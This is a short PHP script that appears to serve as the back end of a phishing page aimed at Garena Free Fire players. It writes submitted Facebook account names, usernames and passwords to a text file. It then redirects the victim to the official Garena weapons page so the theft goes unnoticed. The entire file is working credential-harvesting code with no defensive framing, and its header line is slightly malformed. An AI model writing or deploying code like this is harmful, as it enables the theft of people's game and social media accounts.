<?php


file_put_contents("usernames.txt", "akun: " . $_POST['facebook'] . "Account: " . $_POST['text'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location : https://ff.garena.com/weapons/index/en/')
exit();